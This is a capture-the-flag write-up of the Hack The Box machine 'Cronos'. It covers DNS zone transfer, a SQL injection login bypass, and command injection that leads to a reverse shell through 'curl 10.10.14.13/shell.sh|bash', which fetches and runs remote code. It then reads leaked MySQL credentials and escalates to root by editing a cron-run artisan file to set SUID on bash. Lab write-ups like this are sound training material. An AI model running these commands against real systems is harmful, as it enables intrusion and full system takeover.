# Cronos

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.227.211
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-06 14:42 EDT
Nmap scan report for 10.129.227.211
Host is up (0.0083s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
53/tcp open  domain
80/tcp open  http
```

### DNS

I poked DNS a little bit before going to HTTP, to see if we can find out any hidden domains or something. Based on standard HTB domains, I guessed that it was `cronos.htb` and it worked.

```
$ dig axfr @10.129.227.211 cronos.htb

; <<>> DiG 9.18.8-1-Debian <<>> axfr @10.129.227.211 cronos.htb
; (1 server found)
;; global options: +cmd
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
cronos.htb.             604800  IN      NS      ns1.cronos.htb.
cronos.htb.             604800  IN      A       10.10.10.13
admin.cronos.htb.       604800  IN      A       10.10.10.13
ns1.cronos.htb.         604800  IN      A       10.10.10.13
www.cronos.htb.         604800  IN      A       10.10.10.13
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
;; Query time: 3 msec
;; SERVER: 10.129.227.211#53(10.129.227.211) (TCP)
;; WHEN: Sat May 06 14:44:15 EDT 2023
;; XFR size: 7 records (messages 1, bytes 203)
```

### Cronos.htb

Port 80 reveals the default Apache2 page:

<figure><img src="../../../.gitbook/assets/image (698).png" alt=""><figcaption></figcaption></figure>

After adding `cronos.htb` to the `/etc/hosts` file, this page changes:

<figure><img src="../../../.gitbook/assets/image (644).png" alt=""><figcaption></figcaption></figure>

Checking the page source reveals this is a Laravel application.

<figure><img src="../../../.gitbook/assets/image (550).png" alt=""><figcaption></figcaption></figure>

### SQLI Login Bypass -> RCE

Earlier, we also found an `admin.cronos.htb` through DNS. When visited, it just shows a login page:

<figure><img src="../../../.gitbook/assets/image (889).png" alt=""><figcaption></figcaption></figure>

This looks vulnerable to some kind of injection. I ran `sqlmap` on the login request and found that it might be vulnerable to time-based SQL injection. That also means we can bypass this login page by doing basic injection. When we login, we see that it is a really basic application:

<figure><img src="../../../.gitbook/assets/image (3089).png" alt=""><figcaption></figcaption></figure>

This is obviously vulnerable to command injection, which we can find quite easily:

<figure><img src="../../../.gitbook/assets/image (1961).png" alt=""><figcaption></figcaption></figure>

We can then get a reverse shell using `curl 10.10.14.13/shell.sh|bash`.&#x20;

<figure><img src="../../../.gitbook/assets/image (331).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### MySQL Creds

We can find a `config.php` file containing some credentials in the directory that we spawn in.

```php
www-data@cronos:/var/www/admin$ ls
config.php  index.php  logout.php  session.php  welcome.php
www-data@cronos:/var/www/admin$ cat config.php 
<?php
   define('DB_SERVER', 'localhost');
   define('DB_USERNAME', 'admin');
   define('DB_PASSWORD', 'kEjdbRigfBHUREiNSDs');
   define('DB_DATABASE', 'admin');
   $db = mysqli_connect(DB_SERVER,DB_USERNAME,DB_PASSWORD,DB_DATABASE);
?>
```

We can keep this for now since we don't know if it'll come into play later. There's one user present in this machine:

```
www-data@cronos:/home$ ls -la
total 12
drwxr-xr-x  3 root   root   4096 May 10  2022 .
drwxr-xr-x 23 root   root   4096 May 10  2022 ..
drwxr-xr-x  4 noulis noulis 4096 May 10  2022 noulis
```

We can easily grab the user flag from this.&#x20;

### Laravel Cronjob

Running LinPEAS reveals this:

<figure><img src="../../../.gitbook/assets/image (663).png" alt=""><figcaption></figcaption></figure>

The `root` user was running a PHP file called `artisan` that we had write access to. So we just need to append some commands to the top. We can edit it to include this line:

```php
exec("chmod u+s /bin/bash");
```

Wait for a little bit, and the script should execute. We can then easily get a `root` shell.&#x20;

<figure><img src="../../../.gitbook/assets/image (120).png" alt=""><figcaption></figcaption></figure>
